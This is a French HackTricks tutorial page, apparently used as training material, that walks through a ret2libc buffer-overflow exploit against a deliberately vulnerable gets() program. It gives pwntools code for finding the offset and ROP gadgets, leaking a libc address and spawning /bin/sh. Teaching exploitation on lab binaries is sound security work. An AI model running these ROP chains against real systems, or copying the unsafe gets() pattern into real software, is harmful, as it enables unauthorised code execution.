<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# R√©sum√© rapide

1. **Trouver** l'offset de l'overflow
2. **Trouver** les gadgets `POP_RDI`, `PUTS_PLT` et `MAIN_PLT`
3. Utiliser les gadgets pr√©c√©dents pour **leaker l'adresse m√©moire** de puts ou d'une autre fonction libc et **trouver la version de libc** ([t√©l√©chargez-la](https://libc.blukat.me))
4. Avec la biblioth√®que, **calculer le ROP et l'exploiter**

# Autres tutoriels et binaires pour s'entra√Æner

Ce tutoriel va exploiter le code/binaire propos√© dans ce tutoriel : [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Autres tutoriels utiles : [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

# Code

Nom de fichier : `vuln.c`
```c
#include <stdio.h>

int main() {
    char buffer[32];
    puts("Simple ROP.\n");
    gets(buffer);

    return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector  -no-pie
```
# ROP - Mod√®le de fuite de LIBC

Je vais utiliser le code situ√© ici pour cr√©er l'exploit.\
T√©l√©chargez l'exploit et placez-le dans le m√™me r√©pertoire que le binaire vuln√©rable et donnez les donn√©es n√©cessaires au script:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# 1- Trouver l'offset

Le mod√®le n√©cessite un offset avant de continuer avec l'exploit. Si aucun n'est fourni, il ex√©cutera le code n√©cessaire pour le trouver (par d√©faut `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(r.clean())
    r.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    return
```
**Ex√©cutez** `python template.py` une console GDB sera ouverte avec le programme qui a plant√©. √Ä l'int√©rieur de cette **console GDB**, ex√©cutez `x/wx $rsp` pour obtenir les **octets** qui allaient √©craser le RIP. Enfin, obtenez le **d√©calage** en utilisant une console **python** :
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../.gitbook/assets/image (140).png>)

Apr√®s avoir trouv√© le d√©calage (dans ce cas 40), changez la variable OFFSET √† l'int√©rieur du mod√®le en utilisant cette valeur.\
`OFFSET = "A" * 40`

Une autre fa√ßon serait d'utiliser: `pattern create 1000` -- _ex√©cuter jusqu'√† ret_ -- `pattern search $rsp` de GEF.

# 2- Trouver des gadgets

Maintenant, nous devons trouver des gadgets ROP √† l'int√©rieur du binaire. Ces gadgets ROP seront utiles pour appeler `puts` pour trouver la **libc** utilis√©e, et plus tard pour **lancer l'exploit final**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Le `PUTS_PLT` est n√©cessaire pour appeler la **fonction puts**.\
Le `MAIN_PLT` est n√©cessaire pour appeler **la fonction principale** √† nouveau apr√®s une interaction pour **exploiter** le d√©bordement **√† nouveau** (des tours d'exploitation infinis). **Il est utilis√© √† la fin de chaque ROP pour appeler le programme √† nouveau**.\
Le **POP\_RDI** est n√©cessaire pour **passer** un **param√®tre** √† la fonction appel√©e.

√Ä cette √©tape, vous n'avez pas besoin d'ex√©cuter quoi que ce soit car tout sera trouv√© par pwntools pendant l'ex√©cution.

# 3- Trouver la biblioth√®que LIBC

Maintenant, il est temps de trouver quelle version de la biblioth√®que **libc** est utilis√©e. Pour ce faire, nous allons **fuir** l'**adresse** en m√©moire de la **fonction** `puts` et ensuite nous allons **chercher** dans quelle **version de biblioth√®que** la version de puts est √† cette adresse.
```python
def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()
```
Pour ce faire, la ligne la plus importante du code ex√©cut√© est :
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Cela enverra quelques octets jusqu'√† ce que l'**√©crasement** du **RIP** soit possible : `OFFSET`.\
Ensuite, il d√©finira l'**adresse** du gadget `POP_RDI` de sorte que l'adresse suivante (`FUNC_GOT`) sera enregistr√©e dans le registre **RDI**. Cela est d√ª au fait que nous voulons **appeler puts** en lui **passant** l'**adresse** de `PUTS_GOT` comme adresse en m√©moire de la fonction puts est enregistr√©e √† l'adresse point√©e par `PUTS_GOT`.\
Apr√®s cela, `PUTS_PLT` sera appel√© (avec `PUTS_GOT` √† l'int√©rieur de **RDI**) afin que puts lise le contenu √† l'int√©rieur de `PUTS_GOT` (**l'adresse de la fonction puts en m√©moire**) et l'affiche.\
Enfin, la **fonction principale est appel√©e √† nouveau** afin que nous puissions exploiter √† nouveau le d√©bordement.

De cette fa√ßon, nous avons **tromp√© la fonction puts** pour qu'elle **affiche** l'**adresse** en **m√©moire** de la fonction **puts** (qui se trouve dans la biblioth√®que **libc**). Maintenant que nous avons cette adresse, nous pouvons **rechercher quelle version de libc est utilis√©e**.

![](<../../../.gitbook/assets/image (141).png>)

Comme nous **exploitons** un binaire **local**, il n'est **pas n√©cessaire** de d√©terminer quelle version de **libc** est utilis√©e (il suffit de trouver la biblioth√®que dans `/lib/x86_64-linux-gnu/libc.so.6`).\
Mais, dans le cas d'une exploitation √† distance, je vais expliquer ici comment vous pouvez le trouver :

## 3.1- Recherche de la version de libc (1)

Vous pouvez rechercher quelle biblioth√®que est utilis√©e sur la page web : [https://libc.blukat.me/](https://libc.blukat.me)\
Cela vous permettra √©galement de t√©l√©charger la version d√©couverte de **libc**

![](<../../../.gitbook/assets/image (142).png>)

## 3.2- Recherche de la version de libc (2)

Vous pouvez √©galement faire :

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Cela prendra du temps, soyez patient.\
Pour que cela fonctionne, nous avons besoin de :

* Nom du symbole libc : `puts`
* Adresse libc divulgu√©e : `0x7ff629878690`

Nous pouvons d√©terminer quelle **libc** est la plus susceptible d'√™tre utilis√©e.
```
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Nous avons 2 correspondances (vous devriez essayer la deuxi√®me si la premi√®re ne fonctionne pas). T√©l√©chargez la premi√®re :
```
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
  -> Downloading package
  -> Extracting package
  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Copiez la biblioth√®que libc depuis `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` dans notre r√©pertoire de travail.

## 3.3- Autres fonctions pour la fuite
```python
puts
printf
__libc_start_main
read
gets
```
# 4- Trouver l'adresse de la biblioth√®que libc et exploiter

√Ä ce stade, nous devrions conna√Ætre la biblioth√®que libc utilis√©e. Comme nous exploitons un binaire local, je vais utiliser simplement: `/lib/x86_64-linux-gnu/libc.so.6`

Ainsi, au d√©but de `template.py`, changez la variable **libc** en: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #D√©finir le chemin de la biblioth√®que connue`

En donnant le **chemin** de la **biblioth√®que libc**, le reste de l'**exploit sera automatiquement calcul√©**.

√Ä l'int√©rieur de la fonction `get_addr`, l'**adresse de base de libc** va √™tre calcul√©e:
```python
if libc != "":
    libc.address = leak - libc.symbols[func_name] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Notez que l'**adresse finale de la base de libc doit se terminer par 00**. Si ce n'est pas le cas, vous pourriez avoir divulgu√© une biblioth√®que incorrecte.
{% endhint %}

Ensuite, l'adresse de la fonction `system` et l'**adresse** de la cha√Æne _"/bin/sh"_ vont √™tre **calcul√©es** √† partir de l'**adresse de base** de **libc** et de la **biblioth√®que libc donn√©e**.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Finalement, l'exploit d'ex√©cution /bin/sh va √™tre pr√©par√© et envoy√©:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Expliquons ce dernier ROP.\
Le dernier ROP (`rop1`) a fini par appeler √† nouveau la fonction principale, donc nous pouvons **exploiter √† nouveau** le **d√©bordement** (c'est pourquoi l'`OFFSET` est √† nouveau pr√©sent). Ensuite, nous voulons appeler `POP_RDI` en pointant vers l'**adresse** de _"/bin/sh"_ (`BINSH`) et appeler la fonction **system** (`SYSTEM`) car l'adresse de _"/bin/sh"_ sera transmise en tant que param√®tre.\
Enfin, l'**adresse de la fonction exit** est **appel√©e** pour que le processus **se termine correctement** et qu'aucune alerte ne soit g√©n√©r√©e.

**De cette fa√ßon, l'exploit ex√©cutera un shell **_**/bin/sh**_**.**

![](<../../../.gitbook/assets/image (143).png>)

# 4(2)- Utilisation de ONE\_GADGET

Vous pouvez √©galement utiliser [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) pour obtenir un shell au lieu d'utiliser **system** et **"/bin/sh". ONE\_GADGET** trouvera dans la biblioth√®que libc un moyen d'obtenir un shell en utilisant juste une **adresse ROP**. \
Cependant, il y a g√©n√©ralement des contraintes, les plus courantes et faciles √† √©viter sont comme `[rsp+0x30] == NULL`. Comme vous contr√¥lez les valeurs √† l'int√©rieur du **RSP**, vous devez simplement envoyer des valeurs NULL suppl√©mentaires pour √©viter la contrainte.

![](<../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
# FICHIER D'EXPLOITATION

Vous pouvez trouver un mod√®le pour exploiter cette vuln√©rabilit√© ici:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

# Probl√®mes courants

## MAIN_PLT = elf.symbols\['main'] introuvable

Si le symbole "main" n'existe pas, vous pouvez simplement chercher o√π se trouve le code principal :
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
et d√©finir l'adresse manuellement:
```python
MAIN_PLT = 0x401080
```
## Puts introuvable

Si le binaire n'utilise pas Puts, vous devriez v√©rifier s'il utilise

## `sh: 1: %s%s%s%s%s%s%s%s: not found`

Si vous trouvez cette **erreur** apr√®s avoir cr√©√© **tous** les exploits: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Essayez de **soustraire 64 octets √† l'adresse de "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [d√©p√¥t hacktricks](https://github.com/carlospolop/hacktricks) et au [d√©p√¥t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
